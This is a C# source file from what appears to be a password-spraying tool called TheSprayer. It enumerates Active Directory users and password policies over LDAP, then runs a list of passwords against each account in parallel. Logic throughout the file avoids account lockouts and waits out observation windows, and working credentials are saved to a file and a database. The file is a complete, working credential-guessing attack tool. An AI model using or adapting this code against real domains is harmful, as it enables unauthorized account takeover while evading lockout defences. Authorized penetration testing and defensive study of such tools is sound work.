﻿using System;
using System.Net;
using System.DirectoryServices.Protocols;
using TheSprayer.Models;
using System.Collections.Generic;
using TheSprayer.Extensions;
using System.Linq;
using TheSprayer.Helpers;
using System.Threading.Tasks;
using System.Threading;

namespace TheSprayer.Services
{
    public class ActiveDirectoryService
    {
        private readonly SqliteService _sqlService;
        private readonly string _domain;
        private readonly string _domainUser;
        private readonly string _domainUserPass;
        private readonly string _domainController;
        private readonly string _distinguishedName;
        private readonly string _dbLock = "";

        public ActiveDirectoryService(string domain, string domainUser, string domainUserPass, string domainController)
        {
            _domain = domain;
            _domainUser = domainUser;
            _domainUserPass = domainUserPass;
            _domainController = domainController;

            var splitDomain = _domain.Split('.');
            _distinguishedName = "";
            foreach (var split in splitDomain)
            {
                _distinguishedName += $"dc={split},";
            }
            _distinguishedName = _distinguishedName.TrimEnd(',');

            _sqlService = new SqliteService();
        }

        /// <summary>
        /// Finds all fine grained password policies
        /// </summary>
        /// <remarks>
        /// Note this usually won't find the policy unless the user is privileged.
        /// To find unknown policies see the msDS-ResultantPSO user attribute
        /// </remarks>
        public List<PasswordPolicy> GetFineGrainedPasswordPolicy()
        {
            var policies = new List<PasswordPolicy>();
            string filter = "(objectClass=msDS-PasswordSettings)";

            var connection = CreateLdapConnection();
            var searchRequest = new SearchRequest(_distinguishedName, filter, SearchScope.Subtree);

            try
            {
                var searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

                foreach (SearchResultEntry entry in searchResponse.Entries)
                {
                    var name = entry.Attributes["distinguishedName"][0].ToString();
                    var precedence = entry.Attributes.GetIfExists<int>("msds-passwordsettingsprecedence");
                    var reversibleEncryption = entry.Attributes["msds-passwordreversibleencryptionenabled"][0].ToString() == "TRUE";
                    var complexityRequired = entry.Attributes["msds-passwordcomplexityenabled"][0].ToString() == "TRUE";
                    var pwdMaxAge = Convert.ToInt64(entry.Attributes["msds-maximumpasswordage"][0]) / (double)-864000000000;
                    var pwdMinAge = Convert.ToInt64(entry.Attributes["msds-minimumpasswordage"][0]) / (double)-864000000000;
                    var pwdMinLength = Convert.ToInt32(entry.Attributes["msds-minimumpasswordlength"][0]);
                    var pwdHistoryLength = Convert.ToInt32(entry.Attributes["msds-passwordhistorylength"][0]);
                    var lockoutThreshold = Convert.ToInt32(entry.Attributes["msds-lockoutthreshold"][0]);
                    var lockoutDuration = Convert.ToInt64(entry.Attributes["msds-lockoutduration"][0]) / (double)-600000000;
                    var observationWindow = Convert.ToInt64(entry.Attributes["msds-lockoutobservationwindow"][0]) / (double)-600000000;
                    policies.Add(new PasswordPolicy()
                    {
                        Name = name,
                        Precedence = precedence,
                        PasswordMaxAge = pwdMaxAge,
                        PasswordMinAge = pwdMinAge,
                        PasswordMinLength = pwdMinLength,
                        PasswordHistoryLength = pwdHistoryLength,
                        LockoutThreshold = lockoutThreshold,
                        LockoutDuration = lockoutDuration,
                        ObservationWindow = observationWindow,
                        IsComplexityRequired = complexityRequired,
                        IsEncryptionReversible = reversibleEncryption
                    });
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("\nUnexpected exception occured:\n\t{0}: {1}", e.GetType().Name, e.Message);
            }

            return policies;
        }

        public PasswordPolicy GetPasswordPolicy()
        {
            string filter = "(&(objectClass=domainDNS))";

            var connection = CreateLdapConnection();            
            var searchRequest = new SearchRequest(_distinguishedName, filter, SearchScope.Subtree);

            try
            {
                var searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

                var entry = searchResponse.Entries[0];
                var pwdMaxAge = Convert.ToInt64(entry.Attributes["MaxPwdAge"][0]) / (double)-864000000000;
                var pwdMinAge = Convert.ToInt64(entry.Attributes["MinPwdAge"][0]) / (double)-864000000000;
                var pwdMinLength = Convert.ToInt32(entry.Attributes["MinPwdLength"][0]);
                var pwdHistoryLength = Convert.ToInt32(entry.Attributes["PwdHistoryLength"][0]);
                var lockoutThreshold = Convert.ToInt32(entry.Attributes["LockoutThreshold"][0]);
                var lockoutDuration = Convert.ToInt64(entry.Attributes["LockoutDuration"][0]) / (double)-600000000;
                var observationWindow = Convert.ToInt64(entry.Attributes["LockoutObservationWindow"][0]) / (double)-600000000;
                var passwordProperties = (PasswordProperties)Convert.ToInt32(entry.Attributes["PwdProperties"][0]);
                var complexityRequired = (passwordProperties & PasswordProperties.DOMAIN_PASSWORD_COMPLEX) == PasswordProperties.DOMAIN_PASSWORD_COMPLEX;
                var reversibleEncryption = (passwordProperties & PasswordProperties.DOMAIN_PASSWORD_STORE_CLEARTEXT) == PasswordProperties.DOMAIN_PASSWORD_STORE_CLEARTEXT;
                return new PasswordPolicy()
                {
                    Name = "Default Password Policy",
                    Precedence = int.MaxValue,
                    PasswordMaxAge = pwdMaxAge,
                    PasswordMinAge = pwdMinAge,
                    PasswordMinLength = pwdMinLength,
                    PasswordHistoryLength = pwdHistoryLength,
                    LockoutThreshold = lockoutThreshold,
                    LockoutDuration = lockoutDuration,
                    ObservationWindow = observationWindow,
                    IsComplexityRequired = complexityRequired,
                    IsEncryptionReversible = reversibleEncryption
                };
            }
            catch (Exception e)
            {
                Console.WriteLine("\nUnexpected exception occured:\n\t{0}: {1}", e.GetType().Name, e.Message);
                return null;
            }
        }

        // This class uses the System.DirectoryServices.Protocols namespace to retrieve domain users over LDAP. 
        // There are other options that are easier to work with but this one was chosen because it's the only one that is cross platform.
        public List<ActiveDirectoryUser> GetAllDomainUsers()
        {
            var adUsers = new List<ActiveDirectoryUser>();

            int pageCount = 0;
            // Get specific attributes. There's a heap that aren't relevant and when there are tons of users it will lessen the load on the DC
            string[] attributes = { "userPrincipalName", "sAMAccountName", "distinguishedName", "givenName", "sn", "description", "lastLogon", "badPwdCount", "badPasswordTime", "logonCount", "pwdLastSet", "accountExpires", "createTimeStamp", "ADsPath", "company", "objectSid", "sIDHistory", "adminDescription", "msDS-ResultantPSO", "userAccountControl" };
            
            // LDAP Filter to get all domain users. This needs to be modified but works for testing.
            string filter = "(&(objectCategory=person)(objectClass=user))";

            // Initiate a new LDAP connection.
            var connection = CreateLdapConnection();            
            SearchRequest searchRequest = new(_distinguishedName,
                                      filter,
                                      SearchScope.Subtree,
                                      attributes);

            // set the size of the page results. This is a heavy operation for domain controllers so paging is necessary.
            PageResultRequestControl prc = new(500);
            SearchOptionsControl so = new(SearchOption.DomainScope);
            searchRequest.Controls.Add(prc);
            searchRequest.Controls.Add(so);

            try
            {
                do
                {
                    pageCount++;
                    SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);
                    //find the returned page response control - http://dunnry.com/blog/PagingInSystemDirectoryServicesProtocols.aspx
                    foreach (DirectoryControl control in searchResponse.Controls)
                    {
                        if (control is PageResultResponseControl resultControl)
                        {
                            //update the LDAP cookie for next set
                            prc.Cookie = resultControl.Cookie;
                            break;
                        }
                    }

                    // Loop through every response
                    foreach (SearchResultEntry entry in searchResponse.Entries)
                    {
                        adUsers.Add(new ActiveDirectoryUser()
                        {
                            UserPrincipalName = entry.Attributes.GetIfExists("userPrincipalName"),
                            SamAccountName = entry.Attributes.GetIfExists("sAMAccountName"),
                            DistinguishedName = entry.Attributes.GetIfExists("distinguishedName"),
                            GivenName = entry.Attributes.GetIfExists("givenName"),
                            Surname = entry.Attributes.GetIfExists("sn"),
                            Description = entry.Attributes.GetIfExists("description"),
                            LastLogin = entry.Attributes.GetIfExists<DateTime?>("lastLogon"),
                            BadPasswordAttempts = entry.Attributes.GetIfExists<int>("badPwdCount"),
                            LastBadPasswordTime = entry.Attributes.GetIfExists<DateTime?>("badPasswordTime"),
                            LogonCount = entry.Attributes.GetIfExists<int>("logonCount"),
                            PasswordLastSet = entry.Attributes.GetIfExists<DateTime?>("pwdLastSet"),
                            AccountExpiry = entry.Attributes.GetIfExists<DateTime?>("accountExpires"),
                            DateCreated = entry.Attributes.GetIfExists<DateTime?>("createTimeStamp"),
                            PasswordPolicyName = entry.Attributes.GetIfExists("msDS-ResultantPSO") ?? "Default Password Policy",
                            ADsPath = entry.Attributes.GetIfExists("ADsPath"),
                            Company = entry.Attributes.GetIfExists("company"),
                            ObjectSid = entry.Attributes.GetIfExists("objectSid"),
                            SidHistory = entry.Attributes.GetIfExists("sIDHistory"),
                            AdminDescription = entry.Attributes.GetIfExists("adminDescription"),
                            Disabled = !IsUserActive(entry.Attributes.GetIfExists<int>("userAccountControl"))
                        });
                    }
                } while (prc.Cookie.Length != 0);
            }
            catch (Exception e)
            {
                Console.WriteLine("\nUnexpected exception occured:\n\t{0}: {1}", e.GetType().Name, e.Message);
            }

            return adUsers;
        }

        public static bool IsUserActive(int userAccountControlValue)
        {
            return !Convert.ToBoolean(userAccountControlValue & 0x0002);
        }

        public void SprayPasswords(
            IEnumerable<string> passwords, IEnumerable<string> usersToSpray = null, int attemptsToLeave = 2, 
            string outputFile = null, bool continuous = false, bool noDb = false, bool force = false //TODO: Implement continuous
        )
        {
            var defaultPasswordPolicy = GetPasswordPolicy();
            var fineGrainedPasswordPolicies = GetFineGrainedPasswordPolicy();
            var users = GetAllDomainUsers();
            
            //Filter users down to the list passed in (if any)
            if (usersToSpray != null)
            {
                users = users.Where(u => usersToSpray.Any(u2 => u2.ToLower() == u.SamAccountName.ToLower())).ToList();
                if (!users.Any())
                {
                    Console.WriteLine("No users, exiting!");
                    return;
                }
            }

            //Filter down the list of users
            List<ActiveDirectoryUser> filteredUsers = new();
            if (force)
            {
                ColorConsole.WriteLine($"WARNING: All {users.Count} users will be sprayed. This could lock accounts.", ConsoleColor.Yellow);
                filteredUsers = users.ToList();
            }
            else
            {
                Console.WriteLine("Filtering disabled and nearly locked users...");
                foreach (var user in users)
                {
                    if (ShouldSprayUser(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
                    {
                        filteredUsers.Add(user);
                    }
                }
            }

            //Get the previous attempts for these users, we don't want to double-spray passwords
            Dictionary<string, List<CredentialAttempt>> previousSprays = new();
            if (!noDb)
            {
                previousSprays = _sqlService.GetSprayAttemptsForUsers(filteredUsers.Select(u => u.SamAccountName));
            }
            foreach (var password in passwords)
            {
                //If we have no more users, don't continue
                if (filteredUsers.Count == 0)
                {
                    Console.Write($"{users.Count} users found but they are all at risk of lockout, ");
                    if (!continuous)
                    {
                        Console.WriteLine("exiting.");
                        return;
                    }
                    else
                    {
                        Console.WriteLine($"waiting {defaultPasswordPolicy.ObservationWindow} minutes before retrying to prevent lockout.");
                        Thread.Sleep(TimeSpan.FromMinutes((int)(defaultPasswordPolicy.ObservationWindow + 0.5))); //Rounded up to prevent trying a minute early, just in case

                        //Reset the password attempts since we know it's 0 for everyone on the default policy now (excluding user error, but I'm sure it's fine)
                        foreach (var user in users.Where(u => u.PasswordPolicyName == "Default Password Policy" && !u.Disabled))
                        {
                            user.BadPasswordAttempts = 0;
                            filteredUsers.Add(user);
                        }
                    }
                }

                //Try the current password
                Console.WriteLine($"Trying password {password} against {filteredUsers.Count} of {users.Count} user{(users.Count > 1 ? "s" : "")}...");
                Parallel.ForEach(
                    filteredUsers.ToList(), 
                    new ParallelOptions { MaxDegreeOfParallelism = 1000 }, 
                    user =>
                    {
                        //Skip user if they've previously been sprayed according to the db
                        if (previousSprays.ContainsKey(user.SamAccountName))
                        {
                            var previousAttempt = previousSprays[user.SamAccountName].FirstOrDefault(a => a.Password == password);
                            if (previousAttempt != null) 
                            {
                                if (previousAttempt.Success)
                                {
                                    ColorConsole.WriteLine($"{user.SamAccountName}:{password} (Found in database)");
                                }
                                return;
                            }
                        }

                        //Test the credentials
                        if (TryValidateCredentials(user.SamAccountName, password))
                        {
                            ColorConsole.WriteLine($"{user.SamAccountName}:{password}");
                            if (!string.IsNullOrWhiteSpace(outputFile))
                            {
                                //Avoid simultaniously editing the file and losing results
                                lock (outputFile)
                                {
                                    using var sw = System.IO.File.CreateText(outputFile);
                                    sw.WriteLine($"{user.SamAccountName}:{password}");
                                }
                            }

                            if (!noDb)
                            {
                                lock (_dbLock)
                                {
                                    _sqlService.SaveCredentialPair(user.SamAccountName, password, true);
                                }
                            }
                        }
                        else //Increment users bad password attempts and remove if close to lockout
                        {
                            if (!noDb)
                            {
                                lock (_dbLock)
                                {
                                    _sqlService.SaveCredentialPair(user.SamAccountName, password, false);
                                }
                            }

                            user.BadPasswordAttempts++;
                            user.LastBadPasswordTime = DateTime.Now;
                            if (!ShouldSprayUser(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
                            {
                                filteredUsers.Remove(user);
                            }
                        }
                    }
                );
            }
        }

        public static bool ShouldSprayUser(ActiveDirectoryUser user, PasswordPolicy defaultPasswordPolicy, List<PasswordPolicy> fineGrainedPasswordPolicies, int attemptsToLeave = 2)
        {
            var policyName = user.PasswordPolicyName;
            PasswordPolicy policy;
            if (policyName == "Default Password Policy")
            {
                policy = defaultPasswordPolicy;
            }
            else
            {
                policy = fineGrainedPasswordPolicies.FirstOrDefault(p => p.Name == policyName);
            }

            if (user.Disabled)
            {
                return false;
            }

            if (policy == null) // Fine grained policy that we can't see :(
            {
                // Fine grained password policy detected but not readable, skipping user.
                return false;
            }
            else if (policy.LockoutThreshold == 0) //We can go forever :D
            {
                // Spraying {user.SamAccountName}. No lockout limits.
                return true;
            }
            else
            {
                var remainingAttempts = policy.LockoutThreshold - user.BadPasswordAttempts;
                if (remainingAttempts >= attemptsToLeave)
                {
                    // Spraying {user.SamAccountName}. Attempts before lockout: {remainingAttempts}
                    return true;
                }
                else if (user.LastBadPasswordTime < DateTime.Now.AddMinutes(-1 * policy.ObservationWindow))
                {
                    // User hasn't had an incorrect password in at least the observation window, we can try again
                    return true;
                }
                else
                {
                    // User is too close to being locked, skipping.
                    return false;
                }
            }
        }

        public bool TryValidateCredentials(string username, string password)
        {
            LdapConnection connection = new(new LdapDirectoryIdentifier(_domainController, 389, false, false));
            connection.Credential = new NetworkCredential(username, password);

            try
            {
                connection.Bind();
                return true;
            }
            catch (LdapException)
            {
                return false;
            }
        }

        private LdapConnection CreateLdapConnection()
        {
            var connection = new LdapConnection(new LdapDirectoryIdentifier(_domainController, 389, false, false));
            if (!string.IsNullOrWhiteSpace(_domainUser) && !string.IsNullOrWhiteSpace(_domainUserPass))
            {
                connection.Credential = new NetworkCredential(_domainUser, _domainUserPass);
            }
            return connection;
        }
    }
}